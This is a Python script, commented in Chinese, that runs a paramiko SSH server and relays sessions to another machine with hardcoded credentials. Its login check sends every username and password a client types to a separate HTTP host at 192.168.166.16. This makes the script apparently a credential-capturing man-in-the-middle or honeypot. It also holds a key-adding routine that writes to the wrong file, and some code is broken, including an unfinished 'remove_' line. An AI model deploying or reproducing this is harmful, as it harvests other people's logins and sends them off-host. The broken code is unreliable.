import paramiko                 
import threading                
import socket                  
import sys                      
import subprocess               
import termios                  
import select                   
import requests                 
import os
import rsa 

# 伺服器的 RSA 金鑰
host_key = paramiko.RSAKey.generate(2048)


# 定義一個用戶名和密碼的驗證函數
def check_auth(username, password):
    r = requests.post("http://192.168.166.16:3000/", data = {'username' : username, 'password' : password})
    print(r.text)
    print("身分驗證成功")
    return username == 'pep' and password == 'pep'


# 定義一個 SSH 伺服器類別
class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
        
    def check_auth_password(self, username, password):
        if check_auth(username, password):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
    def check_channel_shell_request(self, channel):
        return True
    
    def add_public_key(self, public_key_path):
        try:
            with open(public_key_path, "r") as public_key_file:
                public_key = public_key_file.read().strip()

            # 追加公钥到 authorized_keys 文件
            with open("/root/.ssh/known_hosts", "a") as authorized_keys_file:
                authorized_keys_file.write(public_key + "\n")

            print("公钥添加成功")
        except Exception as e:
            print("添加公钥失败:", e)
    
# 建立一個 SSH 伺服器
try:
    ssh_server = SSHServer()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)           
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        
    server_socket.bind(('0.0.0.0', 2223))                                       
    server_socket.listen(100)                                                   
    print("等待連接......")

    client_socket, client_addr = server_socket.accept()
    print(f"與 {client_addr} 建立連接")

    transport = paramiko.Transport(client_socket)                               
    transport.add_server_key(host_key)                                         
    transport.start_server(server=ssh_server)   

    chan = transport.accept(20)                                                 
    if chan is None:                                                            
        print('*** No channel.')
        sys.exit(1)                                                             
    print('[+] 連接成功！')  

    chan.send('\r\nWelcome to My SSH Server!\r\n')

    trans = paramiko.Transport(('192.168.166.11', 22))
    trans.start_client()
    trans.auth_password(username='resource', password='resource')
    channel = trans.open_session()
    channel.get_pty()
    channel.invoke_shell()
                                    
    readlist, writelist, errlist = select.select([channel, sys.stdin,], [], []) 

    channel.send("\r")                                                           
    result = channel.recv(8192)                                                  
    channel.send("\r")
    result = channel.recv(8192)
    channel.send("\r")
    result = channel.recv(8192)
    chan.send(result)         

    while True:
        try:
            command = chan.recv(1024)
            if not command:
                print("空命令")
                break

            channel.sendall(command)
            if channel in readlist : 
                print(command)
                result = channel.recv(1024)
                result = result[result.find(b'\x1b[?2004l\r') + len(b'\x1b[?2004l\r'):]
                
                # 斷開連接後退出
                if len(result) == 0:
                    print("使用者斷開連接")
                    print("\r\n**** EOF **** \r\n")
                    chan.close()
                    ssh_server.remove_
                print(result)
                chan.send(result)

           #  output = subprocess.check_output(command.decode(), shell=True)
            
        except Exception as e:
            chan.send(str(e))     


except Exception as e:
    print("無法建立伺服器:", e)
    raise
  